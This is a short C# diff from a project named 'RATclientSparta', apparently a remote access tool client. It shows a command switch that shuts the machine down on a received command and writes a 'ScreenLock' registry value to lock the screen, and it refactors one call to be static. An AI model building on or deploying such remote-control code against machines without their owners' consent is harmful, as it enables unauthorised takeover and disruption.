@@ -107,7 +107,7 @@ namespace RATclientSparta.Server
                         case 14: Shell command = new Shell(); command.Run(@"shutdown /s /t 1"); break;
 
                         //Creating registry value For the Screen lock in registry
-                        case 24: RegistryCreate Item = new RegistryCreate(); Item.Create("ScreenLock", Encoding.ASCII.GetString(message)); screenBlock.CheckIfLockRequired(); break;
+                        case 24: RegistryCreate.Create("ScreenLock", Encoding.ASCII.GetString(message)); screenBlock.CheckIfLockRequired(); break;
                     }
                 }
                 catch { break; }
